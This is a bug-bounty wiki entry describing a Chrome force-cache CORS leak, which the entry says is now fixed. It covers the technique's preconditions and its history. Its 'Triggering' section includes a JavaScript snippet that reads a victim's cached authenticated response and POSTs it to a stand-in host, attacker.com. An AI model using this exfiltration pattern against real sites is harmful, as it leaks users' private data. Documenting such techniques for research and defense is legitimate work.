---
title: Force-Cache CORS Cached-Response Leak (Fixed)
slug: force-cache-cors-leak
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/xs-leaks, technique/cors, technique/cache, technique/historical]
inbound: []
---

# Force-Cache CORS Cached-Response Leak

> Status: **fixed in Chrome** as of late 2024. Documented for historical
> reference and to inspire variants.

## Pattern

Chrome (before fix) cached GET responses for ~2 days by default when they
lacked `Cache-Control: no-store`. `fetch(url, {cache: 'force-cache'})`
forced retrieval from the cache without re-validation. If the cached
response carried `Access-Control-Allow-Origin: *`, a cross-origin script
could read it.

Combine with knowledge or guessing of the cached URL (a CSRF-token-
bearing JSON response, a session preview endpoint, etc.) to exfiltrate
authenticated content despite the browser not sending cookies on the
forced-cache fetch.

Surfaced by Matan Berenstein retweet (2024). Justin verified the
technique was patched at recording time.

## Preconditions (at time of publication)

- Chrome (Blink) versions before the patch.
- Target endpoint returns `Access-Control-Allow-Origin: *` AND lacks
  `Cache-Control: no-store` / `private`.
- Victim previously visited the cached URL (or the URL is fetched by a
  same-site automation the attacker can trigger).

## Detection

- Historical only - modern Chrome enforces a separate cache partition
  for `force-cache` cross-origin reads.

## Triggering (historical)

```js
fetch('https://victim.com/api/me', {cache: 'force-cache'})
  .then(r => r.text())
  .then(body => fetch('https://attacker.com/leak', {method:'POST', body}));
```

## Bypasses

- Modern Chrome cache partitioning by top-level site - defeats the cross-
  origin force-cache read.
- Firefox's "Gecko" rendering engine: status unknown at recording - Justin
  noted plans to add Gecko intent-to-ship monitoring.

## Seen in the wild

- {date: 2024-05-30, source: CT Ep 73} - Matan Berenstein resurfaced the technique; tested as fixed in current Chrome at recording time.

## References

- Critical Thinking Podcast Ep 73 - <https://www.youtube.com/watch?v=uHOxsmdsXUA>
- Chrome Intent-to-Ship - cache partitioning rollout.
- Related: [[../dom-xss/cspt-cache-deception-chain]] (modern equivalent to extract authenticated cached content)
